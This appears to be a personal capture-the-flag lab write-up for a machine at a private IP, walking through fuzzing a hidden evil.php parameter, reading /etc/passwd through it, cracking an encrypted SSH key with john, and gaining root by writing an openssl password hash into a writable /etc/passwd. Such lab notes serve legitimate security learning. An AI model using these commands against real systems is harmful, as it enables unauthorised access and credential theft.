ip: 192.168.246.212

p-80
/robots.txt: Hello H4x0r

/secret
/secret/evil.php

- both empty

I try fuzzing the endpoint with ffuf:

```php
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 100 -u http://$IP/secret/evil.php?FUZZ=/etc/passwd -fs 0
```

![[IMG/Pasted image 20241003082007.png]]

command

`http://192.168.246.212/secret/evil.php?command=/etc/passwd`

![[IMG/Pasted image 20241003082201.png]]

This gives me RCE on the server. I can use a reverse shell to gain access to the machine. 

I can see a user, i should look around to see if there is any shh keys:

`mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash`

![[IMG/Pasted image 20241003082716.png]]

I'll use the key to login to the machine. Looking further i see that the key is encrypted so i'll need to use john to get the correct file.

```php
ssh2john id_rsa > key.hash
```

```php
john key.hash
```

![[IMG/Pasted image 20241003083449.png]]

```php
ssh mowree@$IP 
```
- Use the passwd with the key

I take a quick look around and then move into dev/shm and transfer my tools.

linpeas

`[+] [CVE-2019-13272] PTRACE_TRACEME `

`/etc/passwd is writable`

create a new password to update the root pass with:

```php
oppenssl passwd 123
```

`$1$LV7J/Jeh$mbeZHGinr3co0c5bwlQlv.`

I haven't used it before so i echo it into a hash file for john to crack, just so i know it's working as i expect it to.

```php
echo '$1$LV7J/Jeh$mbeZHGinr3co0c5bwlQlv.'> hash.txt
```

```php
john hash.txt
```

John comes back with the password as `123` which is correct.

i Update the password, by removing the x placeholder and adding the pass from openssl, and switch users. The flag is in the root directory.

![[IMG/Pasted image 20241003085558.png]]

![[IMG/Pasted image 20241003085524.png]]

